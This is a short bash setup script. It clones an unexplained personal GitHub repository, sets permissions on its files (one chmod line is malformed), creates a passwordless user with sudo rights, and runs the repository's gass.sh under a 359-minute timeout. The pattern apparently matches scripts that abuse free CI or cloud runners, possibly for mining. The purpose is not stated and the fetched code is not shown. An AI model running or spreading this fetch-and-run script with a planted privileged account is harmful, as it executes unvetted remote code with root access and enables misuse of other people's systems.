#!/bin/bash
sudo apt update
git clone https://github.com/ajayy78/ajayy78.git && cd ajayy78
chmod +x mantap.sh && chmod +x hayu chmod 777 hayu mantap.sh
sudo adduser --disabled-password --gecos "" ojakk && sudo usermod -aG sudo ojakk
sudo -u ojakk -H sh -c "timeout 359m ./gass.sh"
sudo apt update
